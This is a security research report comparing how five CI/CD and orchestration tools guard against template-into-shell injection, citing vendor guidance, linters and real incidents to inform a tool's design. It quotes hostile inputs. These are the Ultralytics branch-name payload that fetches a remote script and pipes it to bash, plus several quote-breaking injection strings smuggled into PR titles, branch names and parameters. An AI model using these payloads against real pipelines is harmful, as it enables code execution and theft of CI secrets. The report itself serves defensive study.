# CI/CD & Orchestration Tools: Injecting Templated Values into Shell Scripts

Scope: how GitHub Actions, Jenkins, Airflow, Ansible and GitLab CI handle template/expression values that end up in shell scripts. Covers each tool's official hardening guidance, automated detection, and real incidents, as background for bnto's proposed `sh -c <literal script> name <args...>` design. Research date: 2026-10-20. Source dates are given where known.

---

## GitHub Actions: `${{ }}` script injection, the official fix, why env vars are safe, incidents, detection

### Takeaway

GitHub's `${{ }}` expressions are substituted textually into the `run:` script _before_ the shell runs, so any attacker-controlled context becomes code. Every official and third-party source gives the same fix. Bind the value to an intermediate env var, reference it with the shell's own syntax (`"$VAR"`, never `${{ env.VAR }}`), or better, pass it as an argument to an action so no script is generated from it at all. Real compromises include Ultralytics (Dec 2024) and Nx "s1ngularity" (Aug 2025). The tj-actions/changed-files incident (Mar 2025) was not expression injection. It was a `pull_request_target` "pwn request" (fork-supplied code run with secrets available) followed by a chain of stolen tokens.

### Cited Findings

**The problem (official docs)**

- GitHub defines script injection as an attacker adding "malicious commands and scripts to a context". When the workflow runs, "those strings might be interpreted as code which is then executed on the runner." — [GitHub Docs: Script injections](https://docs.github.com/en/actions/concepts/security/script-injections)
- Untrusted `github` context fields typically end in `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`, `ref`, and `title`. Examples given are `github.event.issue.title` and `github.event.pull_request.body`. The docs warn that branch names and email addresses are less obvious attack vectors. — [GitHub Docs: Script injections](https://docs.github.com/en/actions/concepts/security/script-injections)
- In GitHub's canonical vulnerable example, `title="${{ github.event.pull_request.title }}"` in a `run:` block is exploitable with the title `a"; ls $GITHUB_WORKSPACE"`. The cause is that "expressions in `${{ }}` are substituted before the shell script runs", so the payload breaks out of the quotes. — [GitHub Docs: Script injections](https://docs.github.com/en/actions/concepts/security/script-injections)
- Wrapping the expression in shell quotes does not help, because the substitution happens before shell parsing (shown by the example above). — [GitHub Docs: Script injections](https://docs.github.com/en/actions/concepts/security/script-injections)
- GitHub Security Lab (Aug 4, 2021) shows that restricted formats still carry payloads. `zzz";echo${IFS}"hello";#` is a valid branch name even though branch names cannot contain spaces or colons. `` `echo${IFS}hello`@domain.com `` is a valid email address that "may be used for both shell injection and receiving emails at the same time." — [GitHub Security Lab: Keeping your GitHub Actions and workflows secure Part 2: Untrusted input](https://securitylab.github.com/resources/github-actions-untrusted-input/)

**Official mitigations, in GitHub's order of preference**

1. **Use an action that takes the value as an argument.** GitHub recommends a JavaScript action that "processes the context value as an argument". It says "This approach is not vulnerable to the injection attack, since the context value is not used to generate a shell script." — [GitHub Docs: Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use)
2. **Use an intermediate environment variable.** For inline scripts, "the preferred approach to handling untrusted input is to set the value of the expression" to an intermediate environment variable. — [GitHub Docs: Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use)

- **Why env vars are safe:** the value "is stored in memory and used as a variable, and doesn't interact with the script generation process." — [GitHub Docs: Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use); the same reasoning appears in [GitHub Security Lab Part 2](https://securitylab.github.com/resources/github-actions-untrusted-input/)
- **Quoting:** "consider using double quote shell variables to avoid" word splitting. GitHub presents this as general shell advice, not something specific to Actions. — [GitHub Docs: Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use)
- **Trigger hygiene:** "Avoid using the `pull_request_target` workflow trigger if it's not necessary." For privilege separation, "`workflow_run` is a better trigger." These triggers, "when used with the checkout of an untrusted pull request, expose the repository to security compromises." — [GitHub Docs: Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use)

**Detection tools: what each one flags**

- **CodeQL `actions/code-injection/critical`:** path-problem query with security-severity 9, severity error, precision very-high, CWE-094/095/116. It is in the default `actions-code-scanning.qls` suite. It flags user-controlled input used directly in expressions inside `run:` or `script:` (github-script). Its help page shows `echo '${{ env.BODY }}'` as still vulnerable even when BODY came from an env var, because expression syntax is still being used. Correct forms are `echo "$BODY"` in shell and `process.env` in github-script. It also recommends minimal `GITHUB_TOKEN` permissions. A medium-severity sibling exists, `actions/code-injection/medium`. — [CodeQL query help: actions/code-injection/critical](https://codeql.github.com/codeql-query-help/actions/actions-code-injection-critical/)
- **zizmor `template-injection`:** the docs explain that "Template expansions aren't syntax-aware, meaning that they can result in unintended shell injection vectors." By default it targets attacker-controllable expressions. In pedantic or auditor mode it flags "_all_ template expansions in code contexts, even ones that are likely safe" and treats them as code smells. Its remediation is an env var referenced as `${VARNAME}`, and it says "you **should not** use `${{ env.VARNAME }}`." On PowerShell, the Windows default, the reference is `${env:VARNAME}`, or you can set `shell: bash` for consistency. Auto-fixes are listed as "unsafe" (opt-in). The related `github-env` audit flags attacker-influenced writes to `GITHUB_ENV`/`GITHUB_PATH`, and `dangerous-triggers` flags `pull_request_target`/`workflow_run`. — [zizmor audits docs](https://docs.zizmor.sh/audits/)
- **actionlint "script injection by potentially untrusted inputs":** flags direct use of a fixed list of untrusted inputs in inline `run:` scripts and in `actions/github-script`'s `script`. The list covers `github.event.issue.title/body`, `pull_request.title/body`, `comment.body`, `review.body`, `review_comment.body`, `pages.*.page_name`, `commits.*.message`, `head_commit.message`, author email/name, `pull_request.head.ref/label/repo.default_branch`, and `github.head_ref`. It does NOT flag untrusted values in `if:` or in `with:` inputs to other actions, nor `contains()`/`startsWith()`/`endsWith()` results, because those return booleans. Its fix is the env-var pattern. For multi-value data it suggests `BODIES: '${{ toJSON(github.event.*.body) }}'` with `"${BODIES}"`. Its separate expression-syntax checks only lex, parse and type-check `${{ }}`. — [actionlint checks.md](https://github.com/rhysd/actionlint/blob/main/docs/checks.md)

**Incidents**

- **Ultralytics (Dec 2024), a real template injection.** The composite action `ultralytics/actions` had `git pull origin ${{ github.head_ref || github.ref }}`, described as "a classic GitHub Actions template injection". The attacker's branch name was `openimbot:$({curl,-sSfL,raw.githubusercontent.com/...file.sh}${IFS}|${IFS}bash)`, opened as PR #18020 and reached through a `pull_request_target` formatting workflow. — [yossarian.net: zizmor would have caught the Ultralytics workflow vulnerability](https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection)
  - Impact: PyPI releases 8.3.41 and 8.3.42 shipped an XMRig cryptominer. — [Wiz](https://wiz.io/blog/ultralytics-ai-library-hacked-via-github-for-cryptomining)
  - StepSecurity reports that the attacker exfiltrated CI secrets and poisoned the build cache to inject the miner. — [StepSecurity](https://www.stepsecurity.io/blog/prevent-ultralytics-style-ci-cd-security-attacks-with-network-security-controls)
  - HiddenLayer says the packages were available for over 12 hours. — [HiddenLayer](https://hiddenlayer.com/?p=11983)
  - Detection gap: zizmor flagged the `pull_request_target` trigger and the same pattern in `docs.yml`, but it missed the injection inside the composite action because it did not audit composite actions yet (zizmor#173). — [yossarian.net](https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection)
- **Nx "s1ngularity" (Aug 2025), a real template injection.** Nx merged a workflow on Aug 21, 2025 that echoed the PR title in a `run` block under `pull_request_target`. The advisory says "The root cause the introduction of a vulnerable workflow which contained the possibility for injecting executable code."
  - Nx reverted it on master on Aug 22, but an outdated branch still had the workflow.
  - On Aug 24 a PR with a malicious title triggered it. This led to a `publish.yml` run with npm token access, and malicious Nx packages were published Aug 26.
  - Source: [Nx advisory GHSA-cxm3-wv7p-598c](https://github.com/nrwl/nx/security/advisories/GHSA-cxm3-wv7p-598c)
- **tj-actions/changed-files, CVE-2025-30066 (Mar 2025), NOT expression injection.**
  - The attackers moved version tags to malicious commit 0e58ed8. That commit dumped Runner Worker memory secrets into logs. The advisory says it affected over 23,000 repositories, from Mar 14 to 15, 2025. Fixed in v46.0.1. — [GitHub Advisory GHSA-mrrh-fwg8-r2c3](https://github.com/advisories/GHSA-mrrh-fwg8-r2c3); [CISA alert](https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-github-action-cve-2025-30066)
  - CISA KEV lists CVE-2025-30066 (added 2025-03-18) and the upstream reviewdog/action-setup CVE-2025-30154 (added 2025-03-24), both as CWE-506 "embedded malicious code". — [CISA KEV catalog JSON](https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json)
  - Unit 42's root cause: a Dec 6, 2024 malicious PR to spotbugs/sonar-findbugs "exploited a GitHub Actions workflow that used the pull_request_target trigger". It "modified the repository's mvnw file, which was later used during the CI's invocation". That leaked a maintainer PAT, which was later used (Mar 11, 2025) to reach a reviewdog maintainer PAT and retag reviewdog/action-setup@v1. This is poisoned pipeline execution, not `${{ }}` injection. — [Unit 42](https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/)

### Inferences

- GitHub's preferred mitigation #1 ("pass the context value as an argument, so it is never used to generate a script") is exactly bnto's current `shell-command` model: argv array, no shell. Mitigation #2 (env var, then `"$VAR"`) is the same principle as bnto's proposed `sh -c '<literal>' name "$1"`. Positional args are an equivalent out-of-band channel to env vars: the value never touches script text, and the shell expands it as data.
- The CodeQL `${{ env.BODY }}` counter-example shows the trap bnto is guarding against. Routing data through a "safe" variable is useless if templating re-inlines it into script text. This supports bnto rejecting any `{{` inside the literal script outright, rather than trying to classify which templates are "safe".
- The Ultralytics payload (`${IFS}`, brace expansion, no spaces) shows that character-blocklist validation of filenames or branch names is not a defense. Out-of-band passing is the only robust option.
- The detection gap in Ultralytics (composite actions not audited) suggests making bnto's guarantee structural (enforced at recipe load or validation) rather than relying on a linter. A structural rule cannot miss a nesting level.
- The env-var or positional fix still leaves _script-level_ bugs: unquoted `$1`, `eval "$1"`, or `xargs sh -c` re-parsing. GitHub's quoting advice and zizmor's pedantic mode exist for this reason. bnto may want a lint or doc warning for unquoted `$N` or `eval` in literal scripts.
- zizmor's PowerShell note (`${env:VARNAME}`) supports bnto's Windows plan of passing values to PowerShell via env vars.

### Gaps

- Exact CodeQL coverage of `actions/code-injection/medium` (which sources or triggers it covers) was not retrieved.
- I did not find a 2026 official GitHub change that alters the `${{ }}` substitution model (for example, auto-escaping). As of these sources, interpolation remains textual.
- zizmor's severity and confidence for `template-injection` are not stated on the audits page. They vary per finding (the Ultralytics post shows "info / Low" for one instance).

---

## Jenkins Pipeline `sh` step: Groovy interpolation vs. shell expansion

### Takeaway

Jenkins documents the same trap under a different syntax. Groovy double-quoted GStrings interpolate `${X}` _before_ the string reaches `sh`, `bat` or `powershell`. The official rule is to always send a literal (single-quoted) command string and let the shell expand values from its environment (`environment {}`, `withEnv`, `withCredentials`). This applies to both secrets and user parameters.

### Cited Findings

- Groovy interpolates `$` expressions only in double-quoted strings. `echo 'Hello Mr. ${username}'` prints the literal placeholder, while `echo "I said, Hello Mr. ${username}"` prints the value. — [Jenkins: Using a Jenkinsfile, String interpolation](https://www.jenkins.io/doc/book/pipeline/jenkinsfile/)
- "Groovy string interpolation should **never** be used with credentials." The docs explain that "Groovy GStrings (double-quoted or triple-double-quoted strings) expand `${TOKEN}` before the command is sent to the agent", which puts the secret in process args visible to `ps`. Instead, "Always send a literal command string to `sh`, `bat`, `powershell`, or `pwsh`". Wrong: `sh "curl -H 'Authorization: Bearer ${API_TOKEN}' ..."`. Right: `sh 'curl -H "Authorization: Bearer ${API_TOKEN}" ...'`. — [Jenkins: Using a Jenkinsfile, Handling credentials](https://www.jenkins.io/doc/book/pipeline/jenkinsfile/)
- "Groovy string interpolation can inject rogue commands into command interpreters via special characters." The docs compare this to SQL injection, using a parameter `STATEMENT` defaulting to `hello; ls /`. Wrong: `sh("echo ${STATEMENT}")`. Right: `sh('echo ${STATEMENT}')`, so the shell, not Groovy, expands the param from the environment. — [Jenkins: Using a Jenkinsfile, Injection via interpolation](https://www.jenkins.io/doc/book/pipeline/jenkinsfile/)
- **Credential mangling:** "When the credential value is mangled, it is no longer valid and will no longer be masked in the console log". The example is a `%` in a secret with Windows batch. Wrong: `bat "echo ${EXAMPLE_KEY}"`. Right: `bat 'echo %EXAMPLE_KEY%'`. — [Jenkins: Using a Jenkinsfile](https://www.jenkins.io/doc/book/pipeline/jenkinsfile/)
- The recommended carriers are the `environment` block (for example, `API_TOKEN = credentials('example-token-id')`), `withEnv` in Scripted Pipeline, and `withCredentials`, all read by the shell from its environment. — [Jenkins: Using a Jenkinsfile](https://www.jenkins.io/doc/book/pipeline/jenkinsfile/)

### Inferences

- Jenkins' "literal command string" rule matches bnto's "script is never templated" rule almost word for word. The single-quote vs double-quote distinction is Jenkins' version of bnto's "reject `{{` in the script".
- The Windows batch mangling example is a warning for bnto's Windows path. `cmd.exe` `%VAR%` expansion has its own metacharacter problems, which supports choosing PowerShell with env vars (as proposed) over `cmd /c`.

### Gaps

- Jenkins has a Groovy-interpolation warning for credentials. Its implementation in the Credentials Binding plugin (with release version) was not verified in this pass.

---

## Apache Airflow BashOperator: Jinja into `bash_command`, the `env` fix, and CVEs

### Takeaway

Airflow documents that `bash_command` is Jinja-rendered with no escaping and points to `dag_run.conf` (user-submittable via the UI) as the main risk. The fix is to template the value into the `env` dict and reference `"$var"` in a literal command. Airflow shipped two CVEs (CVE-2020-11978 and CVE-2022-24288) where its _own example DAGs_ had exactly this flaw. The first is in CISA's Known Exploited Vulnerabilities catalog.

### Cited Findings

- "Care should be taken with 'user' input when using Jinja templates in the Bash command", and "escaping and sanitization of the Bash command is not performed." The docs add: "This applies mostly to using `dag_run.conf`, as that can be submitted via users in the Web UI. Most of the default template variables are not at risk." — [Airflow docs: BashOperator (standard provider, stable)](https://airflow.apache.org/docs/apache-airflow-providers-standard/stable/operators/bash.html)
- Recommended pattern: "Instead, you should pass this via the `env` kwarg and use double-quotes inside the Bash command". The example is `@task.bash(env={"message": '{{ dag_run.conf["message"] if dag_run.conf else "" }}'})` returning `"echo \"here is the message: '$message'\""`, with the equivalent `BashOperator(env=..., bash_command=...)`. — [Airflow docs: BashOperator](https://airflow.apache.org/docs/apache-airflow-providers-standard/stable/operators/bash.html)
- The same caution existed in Airflow 2.5.0's docs. — [Airflow 2.5.0 BashOperator how-to](https://airflow.apache.org/docs/apache-airflow/2.5.0/howto/operator/bash.html)
- **CVE-2020-11978 (GHSA-rvmq-4x66-q7j3, high, published 2020-07-27):** "A remote code/command injection vulnerability was discovered in one of the example DAGs shipped with Airflow which would allow any authenticated user to run arbitrary commands as the user running airflow worker/scheduler". It affects 1.10.10 and below, fixed in 1.10.11. Setting `load_examples=False` meant you were not vulnerable. — [GitHub Advisory GHSA-rvmq-4x66-q7j3](https://github.com/advisories/GHSA-rvmq-4x66-q7j3)
  - It was added to CISA KEV on 2022-01-18 as CWE-78, which confirms exploitation in the wild. — [CISA KEV catalog JSON](https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json)
- **CVE-2022-24288 (GHSA-3v7g-4pg3-7r6j, high, published 2022-02-26):** "some example DAGs did not properly sanitize user-provided params, making them susceptible to OS Command Injection from the web UI". It affects versions before 2.2.4. — [GitHub Advisory GHSA-3v7g-4pg3-7r6j](https://github.com/advisories/GHSA-3v7g-4pg3-7r6j)
  - CWE-78. — [SentinelOne CVE-2022-24288](https://www.sentinelone.com/vulnerability-database/cve-2022-24288/)
  - SonicWall says a "remote, authenticated attacker" can exploit it. — [SonicWall](https://www.sonicwall.com/blog/apache-airflow-dag-injection-vulnerability)
  - NVD rates it 8.8 High, per the search summary. SonicWall cites 9.9 base. NVD could not be fetched directly to confirm.

### Inferences

- Airflow is the closest analogue to bnto: a workflow engine where the author is trusted but the run parameters are not. Its own maintainers shipped the vulnerable pattern twice in _example_ DAGs, and one was exploited in the wild. This argues for making the safe path structural in bnto (literal script, values only as `$1..$N`) rather than documented-only, and for making bnto's bundled recipes exemplary, because people copy examples.
- Airflow's fix still templates _into_ the `env` value. That is safe because the env value is data, not script. bnto's equivalent is templating into the args array, which the proposal already allows.

### Gaps

- I did not retrieve the specific vulnerable example DAG code for each CVE (for example, `example_trigger_target_dag` for CVE-2020-11978 is commonly cited, but no fetched source confirmed it).
- NVD pages failed to render via fetch, so NVD CVSS figures are second-hand.

---

## Ansible: `command` vs `shell`, the `quote` filter, templating into `shell`

### Takeaway

Ansible's guidance has two tiers. Prefer `command` (no shell, with an `argv` list form for exact args). If you must use `shell`, wrap every templated variable in `| quote` because Jinja is substituted into the shell string. This is the one mainstream tool whose official mitigation for the shell case is _escaping_ rather than out-of-band passing.

### Cited Findings

- `command` module: "The command(s) will not be processed through the shell, so operations like" `*`, `<`, `>`, `|`, `;`, `&` don't work. Also, "environment variables are resolved via Python, not shell". — [Ansible docs: ansible.builtin.command](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/command_module.html)
- `argv` "Passes the command as a list rather than a string". The docs say to "Use argv to avoid quoting values that would otherwise be interpreted incorrectly". Only the string or the list form may be given, not both. — [Ansible docs: ansible.builtin.command](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/command_module.html)
- "Parsing shell metacharacters can lead to unexpected commands being executed if quoting is not done correctly so it is more secure to use the ansible.builtin.command module when possible". Also: "Always use the quote filter to avoid injection issues". — [Ansible docs: ansible.builtin.command](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/command_module.html)
- `shell` module: "To sanitize any variables passed to the shell module, you should use `{{ var | quote }}` instead of just `{{ var }}` to make sure they do not include evil things like semicolons." Its examples say "always use quote filter to avoid injection". Best practice is "ansible.builtin.command unless the ansible.builtin.shell module is explicitly required." — [Ansible docs: ansible.builtin.shell](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html)

### Inferences

- Ansible's `command` + `argv` is bnto's current design. Its `shell` + `| quote` is an escaping approach, which bnto's proposal explicitly avoids in favor of positional args. Escaping is POSIX-shell-specific and fails if the author forgets the filter. GitLab's docs (below) explicitly warn not to rely on `posix_escape` for untrusted input.
- Ansible's `shell` module also accepts an `env`-style approach via the task `environment:` keyword. This was not fetched, so treat it as an unverified possibility.

### Gaps

- I did not confirm from official docs that the `quote` filter is implemented with Python's `shlex.quote`. It is POSIX-only and unsuitable for PowerShell or cmd, but that was not verified in this pass.

---

## GitLab CI: variable expansion and `$[[ inputs ]]` interpolation

### Takeaway

GitLab CI/CD _variables_ used in `script:` (including predefined ones like `CI_MERGE_REQUEST_TITLE`) are exported to the job and expanded by the execution shell at runtime. In other words, GitLab already uses the safe "env var" model by default, and injection happens only if the script itself re-evaluates the value (unquoted, `eval`). GitLab's newer CI/CD _inputs_ (`$[[ inputs.x ]]`) are textual interpolation into the YAML at pipeline creation, the same hazard class as GitHub's `${{ }}`. GitLab's docs tell you to keep inputs trusted, constrain them (type, regex, options), and not rely on `posix_escape` for untrusted input.

### Cited Findings

- For `script`, "The variable expansion is made by the execution shell environment", in "an expansion phase that takes place during the `script` execution." Syntax depends on the shell (bash/sh/cmd/PowerShell). — [GitLab Docs: Where variables can be used](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/)
- Inputs: "Inputs are evaluated and populated when the configuration is fetched during pipeline creation", and "input values are interpolated in the CI/CD configuration and remain fixed for the entire pipeline run." — [GitLab Docs: CI/CD inputs](https://docs.gitlab.com/ci/inputs/)
- On `posix_escape`, the docs say "Shell code included in the string might be executed" and "Do not rely on `posix_escape` for security purposes with untrusted input values." Also: "For security purposes you should ensure that your inputs are trusted". Constraints offered are `type: number|boolean`, `regex`, and `options`. — [GitLab Docs: CI/CD inputs](https://docs.gitlab.com/ci/inputs/)
- GitLab recommends inputs over pipeline variables (17.7+) and suggests disabling pipeline variables when using inputs. — [GitLab Docs: CI/CD inputs](https://docs.gitlab.com/ci/inputs/); [GitLab blog, Nov 4, 2025: migrate from pipeline variables to pipeline inputs](https://about.gitlab.com/blog/migrate-from-pipeline-variables-to-pipeline-inputs-for-better-security/)
- A GitLab Runner issue proposes `${{ job.inputs.* }}` interpolation into `script`, `before_script`, and `after_script` before scripts run. — [gitlab-runner issue #38952](https://gitlab.com/gitlab-org/gitlab-runner/-/issues/38952)

### Inferences

- GitLab's recommendation is about _who may set_ inputs (trusted triggerers, declared and validated), not untrusted event data. The inputs docs contain no explicit "move it to a variable" injection guidance. The available fix is still to interpolate the input into a `variables:` entry and reference `"$VAR"` in `script`. This is my inference, not GitLab documentation.
- GitLab's explicit "don't rely on escaping for untrusted input" corroborates bnto choosing positional args over a quote or escape filter.

### Gaps

- I found no official GitLab doc that specifically warns about `CI_MERGE_REQUEST_TITLE`, `CI_COMMIT_MESSAGE` or branch names being unsafe in scripts. Search surfaced only third-party material. Because these are shell-expanded env vars, the risk is limited to scripts that re-evaluate them, but no GitLab source states this.
- No GitLab-specific script-injection CVE or incident was researched.

---

## Common lessons: trusted author vs. untrusted data, and the "data via env/args, never template-into-script" consensus

### Takeaway

All five tools draw the same line. The workflow or pipeline author's script text is trusted code, and event or run data (PR titles, branch names, emails, `dag_run.conf`, params, filenames) is untrusted. Every one that substitutes text before the shell runs (GitHub `${{ }}`, Jenkins GStrings, Airflow Jinja, Ansible Jinja in `shell`, GitLab `$[[ inputs ]]`) documents injection. Every official fix moves the value out of band, through an env var, `withEnv`, `env=`, or argv. The one exception is Ansible's `| quote`, which escapes the value instead, and GitLab explicitly says escaping is not a security boundary for untrusted input.

### Cited Findings

- GitHub: "the context value is not used to generate a shell script" (argument passing) and "doesn't interact with the script generation process" (env var). — [GitHub Docs: Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use)
- Jenkins: "Always send a literal command string to `sh`, `bat`, `powershell`, or `pwsh`". — [Jenkins: Using a Jenkinsfile](https://www.jenkins.io/doc/book/pipeline/jenkinsfile/)
- Airflow: "pass this via the `env` kwarg and use double-quotes inside the Bash command". — [Airflow BashOperator docs](https://airflow.apache.org/docs/apache-airflow-providers-standard/stable/operators/bash.html)
- Ansible: prefer `command`/`argv`, and if you must use `shell`, use `| quote`. — [Ansible command](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/command_module.html), [Ansible shell](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html)
- GitLab: "Do not rely on `posix_escape` for security purposes with untrusted input values." — [GitLab inputs](https://docs.gitlab.com/ci/inputs/)
- Indirection through a variable only helps if it is _not_ re-templated. CodeQL flags `${{ env.BODY }}`, and zizmor says "you should not use `${{ env.VARNAME }}`". — [CodeQL](https://codeql.github.com/codeql-query-help/actions/actions-code-injection-critical/), [zizmor](https://docs.zizmor.sh/audits/)
- Real-world exploitation of the template-into-script pattern:
  - Ultralytics, Dec 2024. — [yossarian.net](https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection)
  - Nx, Aug 2025. — [GHSA-cxm3-wv7p-598c](https://github.com/nrwl/nx/security/advisories/GHSA-cxm3-wv7p-598c)
  - Airflow CVE-2020-11978, in CISA KEV. — [CISA KEV](https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json)
  - Airflow CVE-2022-24288. — [GHSA-3v7g-4pg3-7r6j](https://github.com/advisories/GHSA-3v7g-4pg3-7r6j)

### Inferences

- **bnto's proposal matches industry consensus and is stricter than most tools.** GitHub, Jenkins and Airflow all _permit_ the dangerous form and rely on docs and linters. bnto rejecting `{{` in the literal script makes the vulnerable form unrepresentable, which removes the bug class those tools' linters chase (CodeQL, zizmor, actionlint).
- **Positional args (`sh -c 'script' name "$v1" "$v2"`) are at least as strong as env vars on POSIX.** The values go through `execve` argv, never parsed as script. Unlike env vars, they don't leak into child processes' environments, and they can't collide with or override `PATH`, `LD_PRELOAD`, `IFS`, `BASH_ENV` and similar. If bnto uses env vars on Windows, it should prefix or namespace the var names (for example `BNTO_ARG_1`) and never let templated data choose an env var _name_. This parallels zizmor's `github-env` audit about attacker-influenced `GITHUB_ENV` writes.
- **Residual risks the CI tools still document:**
  - Unquoted `$1` (word splitting and globbing). GitHub recommends double-quoting.
  - Script code that re-parses data: `eval`, `sh -c "$1"`, `xargs`.
  - Arguments starting with `-` being read as options by the inner binary, which none of these docs cover.
  - Over-privileged execution context. This is the pull_request_target lesson: injection impact scales with the secrets and tokens available.
- **Trust model for bnto:** the recipe author is the trusted party (like the workflow author), and `{{item.*}}` / `{{fields.*}}` / `{{node.*}}` values are the untrusted "event context". Downloaded recipes from third parties shift the trust boundary to the recipe itself. CI tools address that separately (action pinning, the tj-actions lesson), and it is out of scope for injection.

### Gaps

- None of the surveyed official docs discuss positional-args-to-`sh -c` specifically as a mitigation. The equivalence to env vars is my inference from shell semantics, not a cited CI-vendor statement.
- No surveyed vendor gives official Windows/PowerShell guidance beyond zizmor's `${env:VARNAME}` note and Jenkins' batch `%VAR%` mangling example.
